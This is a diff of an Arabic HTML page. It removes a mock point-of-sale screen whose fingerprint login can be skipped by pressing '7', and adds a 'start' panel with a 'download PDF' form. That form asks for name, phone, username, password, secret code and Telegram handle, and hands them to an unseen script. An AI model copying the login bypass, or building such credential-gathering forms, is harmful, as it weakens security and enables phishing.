@@ -1,389 +1,71 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>نظام POS</title>
+  <title>نموذج ويب مع تصدير PDF</title>
+  <link rel="stylesheet" href="pl1.css">
   <style>
-    /* إعداد الألوان والتنسيق */
-  body {
-    background: linear-gradient(135deg, #0a6d64, #0f0f0f);
-    font-family: 'Arial', sans-serif;
-    color: white;
-    margin: 0;
-    padding: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-}
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #2c3e50;
-      color: #ecf0f1;
+      font-family: 'Arial Unicode MS', Arial, sans-serif;
+      direction: rtl; /* تحديد اتجاه النص من اليمين لليسار */
     }
-    .login-screen, .pos-screen {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .login-screen {
-      flex-direction: column;
-    }
-    .login-screen h1 {
-      margin-bottom: 20px;
-      font-size: 24px;
-    }
-    .fingerprint-btn {
-      width: 80px;
-      height: 80px;
-      background-color: #3498db;
-      border: none;
-      border-radius: 50%;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-    .fingerprint-btn:hover {
-      background-color: #2980b9;
-    }
-    .pos-container {
-      width: 100%;
-      max-width: 1200px;
-      background-color: #34495e;
-      padding: 20px;
-      border-radius: 8px;
-    }
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-    .header .client-info {
-      font-size: 20px;
-    }
-    .products-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-bottom: 20px;
-    }
-    .products-table th, .products-table td {
-      padding: 10px;
-      text-align: center;
-      border: 1px solid #7f8c8d;
-    }
-    .products-table th {
-      background-color: #16a085;
-    }
-    .products-table td {
-      background-color: #1abc9c;
-    }
-    .buttons-container {
-      display: flex;
-      justify-content: space-between;
-    }
-    .buttons-container button {
-      padding: 15px 20px;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .add-product-btn {
-      background-color: #3498db;
-    }
-    .add-product-btn:hover {
-      background-color: #2980b9;
-    }
-    .pay-btn {
-      background-color: #27ae60;
-    }
-    .pay-btn:hover {
-      background-color: #1e8449;
-    }
-    .sidebar {
-      position: fixed;
-      top: 0;
-      right: -400px;
-      width: 400px;
-      height: 100%;
-      background-color: #34495e;
-      transition: right 0.3s;
-      overflow-y: auto;
-      z-index: 1000;
-      box-shadow: -2px 0 5px rgba(0, 0, 0, 0.5);
-    }
-    .sidebar.open {
-      right: 0;
-    }
-    .sidebar-header {
-      padding: 20px;
-      background-color: #2c3e50;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      color: #ecf0f1;
-    }
-    .sidebar-header input {
-      width: 70%;
-      padding: 10px;
-      border: none;
-      border-radius: 4px;
-    }
-    .sidebar-products {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      padding: 10px;
-    }
-  .card {
-  width: 190px;
-  height: 254px;
-  background: #07182E;
-  position: relative;
-  display: flex;
-  place-content: center;
-  place-items: center;
-  overflow: hidden;
-  border-radius: 20px;
-}
-
-.card h2 {
-  z-index: 1;
-  color: white;
-  font-size: 2em;
-}
-
-.card::before {
-  content: '';
-  position: absolute;
-  width: 100px;
-  background-image: linear-gradient(180deg, rgb(0, 183, 255), rgb(255, 48, 255));
-  height: 130%;
-  animation: rotBGimg 3s linear infinite;
-  transition: all 0.2s linear;
-}
-
-@keyframes rotBGimg {
-  from {
-    transform: rotate(0deg);
-  }
-
-  to {
-    transform: rotate(360deg);
-  }
-}
-
-.card::after {
-  content: '';
-  position: absolute;
-  background: #07182E;
-  ;
-  inset: 5px;
-  border-radius: 15px;
-}  
-/* .card:hover:before {
-  background-image: linear-gradient(180deg, rgb(81, 255, 0), purple);
-  animation: rotBGimg 3.5s linear infinite;
-} */
-
-
-    .product-card {
-      background-color: #1abc9c;
-      padding: 15px;
-      border-radius: 4px;
-      cursor: pointer;
-      text-align: center;
-      flex: 1 1 calc(50% - 10px);
-      box-sizing: border-box;
-      color: #2c3e50;
-    }
-    .product-card:hover {
-      background-color: #16a085;
-    }
-    .close-sidebar {
-      cursor: pointer;
-      color: #e74c3c;
+    h2, label {
       font-size: 18px;
     }
   </style>
 </head>
 <body>
-  <!-- شاشة تسجيل الدخول -->
-  <div class="login-screen" id="login-screen">
-    <h1>الرجاء تسجيل الدخول باستخدام بصمة الإصبع</h1>
-    <button class="fingerprint-btn" onclick="authenticateFingerprint()">🔒</button>
-  </div>
-
-  <!-- شاشة نظام POS -->
-  <div class="pos-screen" id="pos-screen" style="display: none;">
-    <div class="pos-container">
-      <div class="header">
-        <span class="client-info">#1 - POS Client</span>
-        <span id="total-amount">الإجمالي: 0 دينار</span>
+  <div class="container">
+    <div class="game-control-panel">
+      <div class="outer-frame">
+        <div class="corner top-left"></div>
+        <div class="corner top-right"></div>
+        <div class="corner bottom-left"></div>
+        <div class="corner bottom-right"></div>
       </div>
-      <table class="products-table">
-        <thead>
-          <tr>
-            <th>اسم المنتج</th>
-            <th>الكمية</th>
-            <th>السعر</th>
-            <th>خصم</th>
-            <th>الإجمالي</th>
-            <th>حذف</th>
-          </tr>
-        </thead>
-        <tbody id="products-list">
-          <!-- سيتم إضافة المنتجات ديناميكياً هنا -->
-        </tbody>
-      </table>
-      <div class="buttons-container">
-        <button class="add-product-btn" onclick="toggleSidebar()">إضافة منتج</button>
-        <button class="pay-btn" onclick="processPayment()">عملية الدفع</button>
+
+      <div class="inner-panel">
+        <div class="central-control">
+          <button class="launch-button" id="startButton">
+            <span class="button-face">
+              <span class="button-label">ابدأ</span>
+              <span class="button-glow"></span>
+            </span>
+          </button>
+        </div>
       </div>
     </div>
+
+    <!-- Form Section -->
+    <div class="form-container" id="formContainer">
+      <form id="infoForm">
+        <h2>املأ الحقول</h2>
+        <label for="fullName">الاسم الكامل</label>
+        <input type="text" id="fullName" name="fullName" required>
+
+        <label for="phone">رقم الهاتف</label>
+        <input type="tel" id="phone" name="phone" required>
+
+        <label for="username">اسم المستخدم</label>
+        <input type="text" id="username" name="username" required>
+
+        <label for="password">كلمة المرور</label>
+        <input type="password" id="password" name="password" required>
+
+        <label for="secretCode">الرمز السري</label>
+        <input type="text" id="secretCode" name="secretCode" required>
+
+        <label for="telegram">يوزر التليجرام</label>
+        <input type="text" id="telegram" name="telegram" required>
+
+        <button type="submit" id="submitForm">تحميل PDF</button>
+      </form>
+    </div>
   </div>
 
-  <!-- القائمة الجانبية -->
-  <div class="sidebar" id="sidebar">
-    <div class="sidebar-header">
-      <input type="text" id="search" placeholder="ابحث عن منتج بالاسم أو الباركود" oninput="filterProducts()">
-      <span class="close-sidebar" onclick="toggleSidebar()">✖</span>
-    </div>
-    <div class="sidebar-products" id="products">
-      <!-- المنتجات ستظهر هنا -->
-    </div>
-  </div>
-
-  <script>
-    let total = 0;
-
-    const products = [
-      { id: 1, name: "منتج 1", price: 1000 },
-      { id: 2, name: "منتج 2", price: 2000 },
-      { id: 3, name: "منتج 3", price: 1500 },
-    ];
-
-    async function authenticateFingerprint() {
-      try {
-        // إعداد تحدي WebAuthn للتحقق باستخدام البصمة
-        const publicKey = {
-          challenge: new Uint8Array(32), // تحدٍ عشوائي
-          rp: { name: "نظام POS" },
-          user: {
-            id: new Uint8Array(16), // معرف المستخدم
-            name: "user@example.com",
-            displayName: "User"
-          },
-          pubKeyCredParams: [{ type: "public-key", alg: -7 }], // استخدام مفتاح عام
-          authenticatorSelection: {
-            authenticatorAttachment: "platform", // السماح بالأجهزة المثبتة فقط
-            userVerification: "required", // يتطلب تحقق المستخدم
-          },
-          timeout: 60000, // المهلة
-        };
-
-        const credential = await navigator.credentials.create({ publicKey });
-        if (credential) {
-          document.getElementById('login-screen').style.display = 'none';
-          document.getElementById('pos-screen').style.display = 'flex';
-        }
-      } catch (error) {
-        alert("فشل التحقق باستخدام بصمة الإصبع");
-        console.error(error);
-      }
-    }
-
-    function toggleSidebar() {
-      const sidebar = document.getElementById("sidebar");
-      sidebar.classList.toggle("open");
-      if (sidebar.classList.contains("open")) {
-        renderProducts();
-      }
-    }
-
-    function renderProducts() {
-      const productsContainer = document.getElementById("products");
-      productsContainer.innerHTML = "";
-      products.forEach((product) => {
-        const card = `<div class="product-card" onclick="addProduct(${product.id})">${product.name} - ${product.price} دينار</div>`;
-        productsContainer.innerHTML += card;
-      });
-    }
-
-    function addProduct(id) {
-      const product = products.find((p) => p.id === id);
-      const row = `
-        <tr>
-          <td>${product.name}</td>
-          <td>1</td>
-          <td>${product.price}</td>
-          <td>0</td>
-          <td>${product.price}</td>
-          <td><button onclick="removeProduct(this, ${product.price})">❌</button></td>
-        </tr>
-      `;
-      document.getElementById("products-list").innerHTML += row;
-      total += product.price;
-      document.getElementById("total-amount").innerText = `الإجمالي: ${total} دينار`;
-      toggleSidebar();
-    }
-
-    function removeProduct(button, price) {
-      button.parentElement.parentElement.remove();
-      total -= price;
-      document.getElementById("total-amount").innerText = `الإجمالي: ${total} دينار`;
-    }
-
-    function processPayment() {
-      alert(`تم الدفع بنجاح! الإجمالي: ${total} دينار`);
-      total = 0;
-      document.getElementById("products-list").innerHTML = "";
-      document.getElementById("total-amount").innerText = `الإجمالي: 0 دينار`;
-      
-    }
-  document.addEventListener("keydown", function (event) {
-  // تحقق إذا كان الزر المضغوط هو "7"
-  if (event.key === "7") {
-    // تحقق إذا كانت الشاشة الرئيسية ظاهرة
-    const loginScreen = document.getElementById("login-screen");
-    if (loginScreen.style.display !== "none") {
-      // إخفاء شاشة تسجيل الدخول
-      loginScreen.style.display = "none";
-      // إظهار شاشة نظام POS
-      const posScreen = document.getElementById("pos-screen");
-      posScreen.style.display = "flex";
-    }
-  }
-});
-  let totalBill = 35000;  // المبلغ الإجمالي للفاتورة
-
-// إضافة حدث الضغط على الكيبورد
-document.addEventListener("keydown", function(event) {
-  // تحقق من ضغط زر Fn و Z معًا
-  if (event.getModifierState("Fn") && event.key === "z") {
-    // عرض شاشة الباقي
-    document.getElementById("remaining-screen").style.display = 'flex';
-    document.getElementById("main-screen").style.display = 'none';
-
-    // تحديث المبلغ المتبقي في الشاشة
-    document.getElementById("remaining-amount").innerText = `المبلغ المتبقي: ${totalBill} دينار`;
-  }
-});
-
-// دالة لحساب المبلغ المتبقي عند الضغط على المبالغ المدفوعة
-function calculateRemaining(amountPaid) {
-  const remaining = totalBill - amountPaid;
-  document.getElementById("remaining-amount").innerText = `المبلغ المتبقي: ${remaining >= 0 ? remaining : 0} دينار`;
-}
-
-// العودة إلى الشاشة الرئيسية
-function goBack() {
-  document.getElementById("remaining-screen").style.display = 'none';
-  document.getElementById("main-screen").style.display = 'flex';
-}
-  </script>
+  <!-- إضافة مكتبة jsPDF -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js"></script>
+  <script src="pl2.js"></script>
 </body>
 </html>
